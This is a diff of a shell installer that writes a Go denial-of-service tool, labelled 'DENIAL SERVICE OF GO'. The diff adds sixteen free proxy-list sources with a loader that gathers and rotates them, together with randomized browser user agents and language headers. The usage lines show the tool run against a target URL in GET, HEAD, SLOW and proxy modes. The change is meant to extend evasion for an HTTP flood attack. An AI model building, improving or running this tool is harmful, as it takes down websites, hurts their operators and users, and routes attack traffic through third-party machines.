@@ -23,13 +23,14 @@ echo -e "${WHITE}  DENIAL SERVICE OF GO${NC}"
 echo -e "${CYAN}${SEP}${NC}"
 echo
 
-# Create main.go file directly (CLEAN version - no unused imports)
-echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go...${NC}"
+# Create main.go file directly
+echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go with multiple proxy sources...${NC}"
 
 cat > main.go << 'EOF'
 package main
 
 import (
+	"bufio"
 	"crypto/rand"
 	"crypto/tls"
 	"fmt"
@@ -72,154 +73,174 @@ var (
 		"VE", "VG", "VI", "VN", "VU", "WF", "WS", "YE", "YT", "ZA", "ZM", "ZW",
 	}
 
+	// Multiple proxy API sources
+	proxyAPISources = []string{
+		"https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000",
+		"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+		"https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt",
+		"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
+		"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
+		"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+		"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
+		"https://proxy-list.download/api/v1/get?type=http",
+		"https://www.proxy-list.download/api/v1/get?type=http",
+		"https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
+		"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+		"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
+		"https://api.openproxylist.xyz/http.txt",
+		"https://proxylist.icu/proxy/http.txt",
+		"https://raw.githubusercontent.com/ALIILAPRO/proxy-list/main/http.txt",
+	}
+
 	acceptLanguages = []string{
-	"en-US,en;q=0.9",
-	"en-US,en;q=0.9,fr;q=0.8,de;q=0.7,es;q=0.6,ja;q=0.5,zh-CN;q=0.4",
-	"en-GB,en;q=0.9,en-US;q=0.8",
-	"en-US,en;q=0.9,es;q=0.8,pt;q=0.7",
-	"en-US,en;q=0.9,ru;q=0.8,uk;q=0.7",
-	"en-US,en;q=0.9,nl;q=0.8,zh-CN;q=0.7,zh;q=0.6,pt-BR;q=0.5,pt;q=0.4,lv;q=0.3,ja;q=0.2,id;q=0.1,es;q=0.1,th;q=0.1,hu;q=0.1,da;q=0.1,fr;q=0.1,tr;q=0.1,it;q=0.1,ms;q=0.1,hi;q=0.1,zh-TW;q=0.1,ru;q=0.1,uk;q=0.1,sv;q=0.1,ko;q=0.1",
-	"en-US,en;q=0.5",
-	"en-US;q=0.8,en;q=0.7",
-	"en-GB,en;q=0.9",
-	"en-CA,en;q=0.9",
-	"en-AU,en;q=0.9",
-	"en-NZ,en;q=0.9",
-	"en-ZA,en;q=0.9",
-	"en-IE,en;q=0.9",
-	"en-IN,en;q=0.9",
-	"ar-SA,ar;q=0.9",
-	"az-Latn-AZ,az;q=0.9",
-	"be-BY,be;q=0.9",
-	"bg-BG,bg;q=0.9",
-	"bn-IN,bn;q=0.9",
-	"ca-ES,ca;q=0.9",
-	"cs-CZ,cs;q=0.9",
-	"cy-GB,cy;q=0.9",
-	"da-DK,da;q=0.9",
-	"de-DE,de;q=0.9",
-	"el-GR,el;q=0.9",
-	"es-ES,es;q=0.9",
-	"et-EE,et;q=0.9",
-	"eu-ES,eu;q=0.9",
-	"fa-IR,fa;q=0.9",
-	"fi-FI,fi;q=0.9",
-	"fr-FR,fr;q=0.9",
-	"ga-IE,ga;q=0.9",
-	"gl-ES,gl;q=0.9",
-	"gu-IN,gu;q=0.9",
-	"he-IL,he;q=0.9",
-	"hi-IN,hi;q=0.9",
-	"hr-HR,hr;q=0.9",
-	"hu-HU,hu;q=0.9",
-	"hy-AM,hy;q=0.9",
-	"id-ID,id;q=0.9",
-	"is-IS,is;q=0.9",
-	"it-IT,it;q=0.9",
-	"ja-JP,ja;q=0.9",
-	"ka-GE,ka;q=0.9",
-	"kk-KZ,kk;q=0.9",
-	"km-KH,km;q=0.9",
-	"kn-IN,kn;q=0.9",
-	"ko-KR,ko;q=0.9",
-	"ky-KG,ky;q=0.9",
-	"lo-LA,lo;q=0.9",
-	"lt-LT,lt;q=0.9",
-	"lv-LV,lv;q=0.9",
-	"mk-MK,mk;q=0.9",
-	"ml-IN,ml;q=0.9",
-	"mn-MN,mn;q=0.9",
-	"mr-IN,mr;q=0.9",
-	"ms-MY,ms;q=0.9",
-	"mt-MT,mt;q=0.9",
-	"my-MM,my;q=0.9",
-	"nb-NO,nb;q=0.9",
-	"ne-NP,ne;q=0.9",
-	"nl-NL,nl;q=0.9",
-	"nn-NO,nn;q=0.9",
-	"or-IN,or;q=0.9",
-	"pa-IN,pa;q=0.9",
-	"pl-PL,pl;q=0.9",
-	"pt-BR,pt;q=0.9",
-	"pt-PT,pt;q=0.9",
-	"ro-RO,ro;q=0.9",
-	"ru-RU,ru;q=0.9",
-	"si-LK,si;q=0.9",
-	"sk-SK,sk;q=0.9",
-	"sl-SI,sl;q=0.9",
-	"sq-AL,sq;q=0.9",
-	"sr-Cyrl-RS,sr;q=0.9",
-	"sr-Latn-RS,sr;q=0.9",
-	"sv-SE,sv;q=0.9",
-	"sw-KE,sw;q=0.9",
-	"ta-IN,ta;q=0.9",
-	"te-IN,te;q=0.9",
-	"th-TH,th;q=0.9",
-	"tr-TR,tr;q=0.9",
-	"uk-UA,uk;q=0.9",
-	"ur-PK,ur;q=0.9",
-	"uz-Latn-UZ,uz;q=0.9",
-	"vi-VN,vi;q=0.9",
-	"zh-CN,zh;q=0.9",
-	"zh-HK,zh;q=0.9",
-	"zh-TW,zh;q=0.9",
-	"am-ET,am;q=0.8",
-	"as-IN,as;q=0.8",
-	"az-Cyrl-AZ,az;q=0.8",
-	"bn-BD,bn;q=0.8",
-	"bs-Cyrl-BA,bs;q=0.8",
-	"bs-Latn-BA,bs;q=0.8",
-	"dz-BT,dz;q=0.8",
-	"fil-PH,fil;q=0.8",
-	"fr-CA,fr;q=0.8",
-	"fr-CH,fr;q=0.8",
-	"fr-BE,fr;q=0.8",
-	"fr-LU,fr;q=0.8",
-	"gsw-CH,gsw;q=0.8",
-	"ha-Latn-NG,ha;q=0.8",
-	"hr-BA,hr;q=0.8",
-	"ig-NG,ig;q=0.8",
-	"ii-CN,ii;q=0.8",
-	"jv-Latn-ID,jv;q=0.8",
-	"kkj-CM,kkj;q=0.8",
-	"kl-GL,kl;q=0.8",
-	"kok-IN,kok;q=0.8",
-	"ks-Arab-IN,ks;q=0.8",
-	"lb-LU,lb;q=0.8",
-	"ln-CG,ln;q=0.8",
-	"mn-Mong-CN,mn;q=0.8",
-	"mr-MN,mr;q=0.8",
-	"ms-BN,ms;q=0.8",
-	"mua-CM,mua;q=0.8",
-	"nds-DE,nds;q=0.8",
-	"ne-IN,ne;q=0.8",
-	"nso-ZA,nso;q=0.8",
-	"oc-FR,oc;q=0.8",
-	"pa-Arab-PK,pa;q=0.8",
-	"ps-AF,ps;q=0.8",
-	"quz-BO,quz;q=0.8",
-	"quz-EC,quz;q=0.8",
-	"quz-PE,quz;q=0.8",
-	"rm-CH,rm;q=0.8",
-	"rw-RW,rw;q=0.8",
-	"sd-Arab-PK,sd;q=0.8",
-	"se-NO,se;q=0.8",
-	"smn-FI,smn;q=0.8",
-	"sms-FI,sms;q=0.8",
-	"syr-SY,syr;q=0.8",
-	"tg-Cyrl-TJ,tg;q=0.8",
-	"ti-ER,ti;q=0.8",
-	"tk-TM,tk;q=0.8",
-	"tn-ZA,tn;q=0.8",
-	"tt-RU,tt;q=0.8",
-	"ug-CN,ug;q=0.8",
-	"uz-Cyrl-UZ,uz;q=0.8",
-	"ve-ZA,ve;q=0.8",
-	"wo-SN,wo;q=0.8",
-	"xh-ZA,xh;q=0.8",
-	"yo-NG,yo;q=0.8",
-	"zgh-MA,zgh;q=0.8",
-	"zu-ZA,zu;q=0.8",
+		"en-US,en;q=0.9",
+		"en-US,en;q=0.9,fr;q=0.8,de;q=0.7,es;q=0.6,ja;q=0.5,zh-CN;q=0.4",
+		"en-GB,en;q=0.9,en-US;q=0.8",
+		"en-US,en;q=0.9,es;q=0.8,pt;q=0.7",
+		"en-US,en;q=0.9,ru;q=0.8,uk;q=0.7",
+		"en-US,en;q=0.9,nl;q=0.8,zh-CN;q=0.7,zh;q=0.6,pt-BR;q=0.5,pt;q=0.4,lv;q=0.3,ja;q=0.2,id;q=0.1,es;q=0.1,th;q=0.1,hu;q=0.1,da;q=0.1,fr;q=0.1,tr;q=0.1,it;q=0.1,ms;q=0.1,hi;q=0.1,zh-TW;q=0.1,ru;q=0.1,uk;q=0.1,sv;q=0.1,ko;q=0.1",
+		"en-US,en;q=0.5",
+		"en-US;q=0.8,en;q=0.7",
+		"en-GB,en;q=0.9",
+		"en-CA,en;q=0.9",
+		"en-AU,en;q=0.9",
+		"en-NZ,en;q=0.9",
+		"en-ZA,en;q=0.9",
+		"en-IE,en;q=0.9",
+		"en-IN,en;q=0.9",
+		"ar-SA,ar;q=0.9",
+		"az-Latn-AZ,az;q=0.9",
+		"be-BY,be;q=0.9",
+		"bg-BG,bg;q=0.9",
+		"bn-IN,bn;q=0.9",
+		"ca-ES,ca;q=0.9",
+		"cs-CZ,cs;q=0.9",
+		"cy-GB,cy;q=0.9",
+		"da-DK,da;q=0.9",
+		"de-DE,de;q=0.9",
+		"el-GR,el;q=0.9",
+		"es-ES,es;q=0.9",
+		"et-EE,et;q=0.9",
+		"eu-ES,eu;q=0.9",
+		"fa-IR,fa;q=0.9",
+		"fi-FI,fi;q=0.9",
+		"fr-FR,fr;q=0.9",
+		"ga-IE,ga;q=0.9",
+		"gl-ES,gl;q=0.9",
+		"gu-IN,gu;q=0.9",
+		"he-IL,he;q=0.9",
+		"hi-IN,hi;q=0.9",
+		"hr-HR,hr;q=0.9",
+		"hu-HU,hu;q=0.9",
+		"hy-AM,hy;q=0.9",
+		"id-ID,id;q=0.9",
+		"is-IS,is;q=0.9",
+		"it-IT,it;q=0.9",
+		"ja-JP,ja;q=0.9",
+		"ka-GE,ka;q=0.9",
+		"kk-KZ,kk;q=0.9",
+		"km-KH,km;q=0.9",
+		"kn-IN,kn;q=0.9",
+		"ko-KR,ko;q=0.9",
+		"ky-KG,ky;q=0.9",
+		"lo-LA,lo;q=0.9",
+		"lt-LT,lt;q=0.9",
+		"lv-LV,lv;q=0.9",
+		"mk-MK,mk;q=0.9",
+		"ml-IN,ml;q=0.9",
+		"mn-MN,mn;q=0.9",
+		"mr-IN,mr;q=0.9",
+		"ms-MY,ms;q=0.9",
+		"mt-MT,mt;q=0.9",
+		"my-MM,my;q=0.9",
+		"nb-NO,nb;q=0.9",
+		"ne-NP,ne;q=0.9",
+		"nl-NL,nl;q=0.9",
+		"nn-NO,nn;q=0.9",
+		"or-IN,or;q=0.9",
+		"pa-IN,pa;q=0.9",
+		"pl-PL,pl;q=0.9",
+		"pt-BR,pt;q=0.9",
+		"pt-PT,pt;q=0.9",
+		"ro-RO,ro;q=0.9",
+		"ru-RU,ru;q=0.9",
+		"si-LK,si;q=0.9",
+		"sk-SK,sk;q=0.9",
+		"sl-SI,sl;q=0.9",
+		"sq-AL,sq;q=0.9",
+		"sr-Cyrl-RS,sr;q=0.9",
+		"sr-Latn-RS,sr;q=0.9",
+		"sv-SE,sv;q=0.9",
+		"sw-KE,sw;q=0.9",
+		"ta-IN,ta;q=0.9",
+		"te-IN,te;q=0.9",
+		"th-TH,th;q=0.9",
+		"tr-TR,tr;q=0.9",
+		"uk-UA,uk;q=0.9",
+		"ur-PK,ur;q=0.9",
+		"uz-Latn-UZ,uz;q=0.9",
+		"vi-VN,vi;q=0.9",
+		"zh-CN,zh;q=0.9",
+		"zh-HK,zh;q=0.9",
+		"zh-TW,zh;q=0.9",
+		"am-ET,am;q=0.8",
+		"as-IN,as;q=0.8",
+		"az-Cyrl-AZ,az;q=0.8",
+		"bn-BD,bn;q=0.8",
+		"bs-Cyrl-BA,bs;q=0.8",
+		"bs-Latn-BA,bs;q=0.8",
+		"dz-BT,dz;q=0.8",
+		"fil-PH,fil;q=0.8",
+		"fr-CA,fr;q=0.8",
+		"fr-CH,fr;q=0.8",
+		"fr-BE,fr;q=0.8",
+		"fr-LU,fr;q=0.8",
+		"gsw-CH,gsw;q=0.8",
+		"ha-Latn-NG,ha;q=0.8",
+		"hr-BA,hr;q=0.8",
+		"ig-NG,ig;q=0.8",
+		"ii-CN,ii;q=0.8",
+		"jv-Latn-ID,jv;q=0.8",
+		"kkj-CM,kkj;q=0.8",
+		"kl-GL,kl;q=0.8",
+		"kok-IN,kok;q=0.8",
+		"ks-Arab-IN,ks;q=0.8",
+		"lb-LU,lb;q=0.8",
+		"ln-CG,ln;q=0.8",
+		"mn-Mong-CN,mn;q=0.8",
+		"mr-MN,mr;q=0.8",
+		"ms-BN,ms;q=0.8",
+		"mua-CM,mua;q=0.8",
+		"nds-DE,nds;q=0.8",
+		"ne-IN,ne;q=0.8",
+		"nso-ZA,nso;q=0.8",
+		"oc-FR,oc;q=0.8",
+		"pa-Arab-PK,pa;q=0.8",
+		"ps-AF,ps;q=0.8",
+		"quz-BO,quz;q=0.8",
+		"quz-EC,quz;q=0.8",
+		"quz-PE,quz;q=0.8",
+		"rm-CH,rm;q=0.8",
+		"rw-RW,rw;q=0.8",
+		"sd-Arab-PK,sd;q=0.8",
+		"se-NO,se;q=0.8",
+		"smn-FI,smn;q=0.8",
+		"sms-FI,sms;q=0.8",
+		"syr-SY,syr;q=0.8",
+		"tg-Cyrl-TJ,tg;q=0.8",
+		"ti-ER,ti;q=0.8",
+		"tk-TM,tk;q=0.8",
+		"tn-ZA,tn;q=0.8",
+		"tt-RU,tt;q=0.8",
+		"ug-CN,ug;q=0.8",
+		"uz-Cyrl-UZ,uz;q=0.8",
+		"ve-ZA,ve;q=0.8",
+		"wo-SN,wo;q=0.8",
+		"xh-ZA,xh;q=0.8",
+		"yo-NG,yo;q=0.8",
+		"zgh-MA,zgh;q=0.8",
+		"zu-ZA,zu;q=0.8",
 	}
 
 	acceptHeaders = []string{
@@ -276,7 +297,6 @@ var (
 	proxies         []string
 	proxyMu         sync.RWMutex
 	proxyIndex      uint64
-	proxyAPI        = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000"
 	refreshInterval = 5 * time.Minute
 	colorIndex      = 0
 	colorMu         sync.Mutex
@@ -451,39 +471,69 @@ func (p *ConnectionPool) CloseIdleConnections() {
 	}
 }
 
-func loadProxiesFromAPI() {
-	client := &http.Client{Timeout: 10 * time.Second}
-	resp, err := client.Get(proxyAPI)
-	if err != nil {
-		return
+func loadProxiesFromMultipleSources() {
+	var allProxies []string
+	proxySources := proxyAPISources
+	
+	fmt.Printf("[+] Loading proxies from %d sources...\n", len(proxySources))
+	
+	for i, api := range proxySources {
+		client := &http.Client{Timeout: 10 * time.Second}
+		resp, err := client.Get(api)
+		if err != nil {
+			continue
+		}
+		
+		body, _ := io.ReadAll(resp.Body)
+		resp.Body.Close()
+		
+		scanner := bufio.NewScanner(strings.NewReader(string(body)))
+		count := 0
+		for scanner.Scan() {
+			line := strings.TrimSpace(scanner.Text())
+			if line != "" && strings.Contains(line, ":") && !strings.HasPrefix(line, "#") {
+				// Basic validation - check if it has port number
+				parts := strings.Split(line, ":")
+				if len(parts) >= 2 {
+					if _, err := strconv.Atoi(parts[1]); err == nil {
+						allProxies = append(allProxies, line)
+						count++
+					}
+				}
+			}
+		}
+		
+		if count > 0 {
+			fmt.Printf("[+] Source %d/%d: Loaded %d proxies\n", i+1, len(proxySources), count)
+		}
+		
+		time.Sleep(500 * time.Millisecond) // Be respectful to APIs
 	}
-	defer resp.Body.Close()
-	if resp.StatusCode != http.StatusOK {
-		return
-	}
-
-	body, _ := io.ReadAll(resp.Body)
-	lines := strings.Split(string(body), "\n")
-
-	newProxies := []string{}
-	for _, line := range lines {
-		line = strings.TrimSpace(line)
-		if line != "" && strings.Contains(line, ":") && !strings.HasPrefix(line, "#") {
-			newProxies = append(newProxies, line)
+	
+	// Remove duplicates
+	uniqueProxies := make(map[string]bool)
+	var cleanProxies []string
+	for _, proxy := range allProxies {
+		if !uniqueProxies[proxy] {
+			uniqueProxies[proxy] = true
+			cleanProxies = append(cleanProxies, proxy)
 		}
 	}
-
+	
 	proxyMu.Lock()
-	proxies = newProxies
+	proxies = cleanProxies
 	proxyMu.Unlock()
 	atomic.StoreUint64(&proxyIndex, 0)
+	
+	fmt.Printf("[+] Total unique proxies loaded: %d\n", len(proxies))
 }
 
 func proxyRefresher() {
 	ticker := time.NewTicker(refreshInterval)
 	defer ticker.Stop()
 	for range ticker.C {
-		loadProxiesFromAPI()
+		fmt.Printf("[+] Refreshing proxies...\n")
+		loadProxiesFromMultipleSources()
 	}
 }
 
@@ -535,7 +585,6 @@ func generateRandomUA() string {
 	browserType := randInt(1, 100)
 	countryCode := randomCountryCode()
 	
-	// Windows versions (2025-2026)
 	windowsVersions := []string{
 		"Windows NT 10.0; Win64; x64",
 		"Windows NT 11.0; Win64; x64",
@@ -543,7 +592,6 @@ func generateRandomUA() string {
 		"Windows NT 10.0; Win64; x64; Xbox",
 	}
 	
-	// macOS versions (2025-2026)
 	macVersions := []string{
 		"Macintosh; Intel Mac OS X 15_0",
 		"Macintosh; Intel Mac OS X 15_1",
@@ -554,7 +602,6 @@ func generateRandomUA() string {
 		"Macintosh; ARM Mac OS X 16_0",
 	}
 	
-	// Linux distributions
 	linuxVersions := []string{
 		"X11; Linux x86_64",
 		"X11; Ubuntu; Linux x86_64",
@@ -563,34 +610,29 @@ func generateRandomUA() string {
 		"X11; Linux x86_64; Arch",
 	}
 	
-	// Chrome versions (2025-2026)
 	chromeMajor := randInt(141, 165)
 	chromeBuild := randInt(5000, 8000)
 	chromePatch := randInt(0, 99)
 	chromeVersion := fmt.Sprintf("%d.0.%d.%d", chromeMajor, chromeBuild, chromePatch)
 	
-	// Firefox versions (2025-2026)
 	firefoxMajor := randInt(135, 165)
 	firefoxMinor := randInt(0, 9)
 	firefoxPatch := randInt(0, 99)
 	firefoxVersion := fmt.Sprintf("%d.%d.%d", firefoxMajor, firefoxMinor, firefoxPatch)
 	
-	// Edge versions (2025-2026)
 	edgeMajor := randInt(141, 165)
 	edgeBuild := randInt(5000, 8000)
 	edgePatch := randInt(0, 99)
 	edgeVersion := fmt.Sprintf("%d.0.%d.%d", edgeMajor, edgeBuild, edgePatch)
 	
-	// Safari versions (2025-2026)
 	safariMajor := randInt(18, 22)
 	safariMinor := randInt(0, 5)
 	safariVersion := fmt.Sprintf("%d.%d", safariMajor, safariMinor)
 	
-	// Mobile browsers
 	androidVersions := []string{"15", "16", "17"}
 	androidVersion := androidVersions[randInt(0, len(androidVersions)-1)]
 	
-	if browserType <= 45 { // Chrome 45%
+	if browserType <= 45 {
 		osType := randInt(1, 100)
 		var os string
 		if osType <= 40 {
@@ -601,7 +643,7 @@ func generateRandomUA() string {
 			os = linuxVersions[randInt(0, len(linuxVersions)-1)]
 		}
 		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", os, countryCode, chromeVersion)
-	} else if browserType <= 75 { // Firefox 30%
+	} else if browserType <= 75 {
 		osType := randInt(1, 100)
 		var os string
 		if osType <= 40 {
@@ -612,22 +654,22 @@ func generateRandomUA() string {
 			os = linuxVersions[randInt(0, len(linuxVersions)-1)]
 		}
 		return fmt.Sprintf("Mozilla/5.0 (%s; %s; rv:%s) Gecko/20100101 Firefox/%s", os, countryCode, firefoxVersion, firefoxVersion)
-	} else if browserType <= 88 { // Edge 13%
+	} else if browserType <= 88 {
 		os := windowsVersions[randInt(0, len(windowsVersions)-1)]
 		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 Edg/%s", os, countryCode, edgeVersion, edgeVersion)
-	} else if browserType <= 95 { // Safari 7%
+	} else if browserType <= 95 {
 		os := macVersions[randInt(0, len(macVersions)-1)]
 		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Safari/605.1.15", os, countryCode, safariVersion)
-	} else { // Mobile browsers 5%
+	} else {
 		mobileType := randInt(1, 100)
-		if mobileType <= 60 { // Android Chrome
+		if mobileType <= 60 {
 			device := []string{"SM-G998B", "Pixel 9 Pro", "OnePlus 12", "Xiaomi 14", "SM-S938B"}[randInt(0, 4)]
 			return fmt.Sprintf("Mozilla/5.0 (Linux; Android %s; %s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Mobile Safari/537.36", androidVersion, countryCode, device, chromeVersion)
-		} else if mobileType <= 85 { // iPhone Safari
+		} else if mobileType <= 85 {
 			iphoneModel := []string{"iPhone18,1", "iPhone18,2", "iPhone18,3"}[randInt(0, 2)]
 			iosVersion := []string{"18_0", "18_1", "18_2", "19_0"}[randInt(0, 3)]
 			return fmt.Sprintf("Mozilla/5.0 (%s; %s; CPU iPhone OS %s like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Mobile/15E148 Safari/604.1", iphoneModel, countryCode, iosVersion, safariVersion)
-		} else { // Samsung Internet
+		} else {
 			samsungVersion := fmt.Sprintf("%d.0", randInt(25, 30))
 			return fmt.Sprintf("Mozilla/5.0 (Linux; Android %s; %s; SAMSUNG SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/%s Chrome/%s Mobile", androidVersion, countryCode, samsungVersion, chromeVersion)
 		}
@@ -729,10 +771,12 @@ func main() {
 	useProxy := false
 	if len(os.Args) >= 5 && os.Args[4] == "proxy" {
 		useProxy = true
-		loadProxiesFromAPI()
+		fmt.Println("[+] Loading proxies from multiple sources...")
+		loadProxiesFromMultipleSources()
 		if len(proxies) > 0 {
 			go proxyRefresher()
 		} else {
+			fmt.Println("[!] No proxies loaded, continuing without proxy")
 			useProxy = false
 		}
 	}
@@ -980,7 +1024,7 @@ if [ ! -f "main.go" ]; then
     echo -e " ${RED}✗ Error: Failed to create main.go${NC}"
     exit 1
 else
-    echo -e " ${GREEN}✓ main.go created successfully${NC}"
+    echo -e " ${GREEN}✓ main.go created successfully (16 proxy sources)${NC}"
 fi
 
 echo
@@ -1091,6 +1135,8 @@ if [ $? -eq 0 ]; then
     echo -e "   ${YELLOW}./main https://target.com 30 HEAD${NC}"
     echo -e "   ${YELLOW}./main https://target.com 60 SLOW${NC}"
     echo -e "   ${YELLOW}./main https://target.com 60 GET proxy${NC}"
+    echo
+    echo -e " ${CYAN}►${NC} Proxy mode will load from ${YELLOW}16 different sources${NC}"
     echo
     exit 0
 else
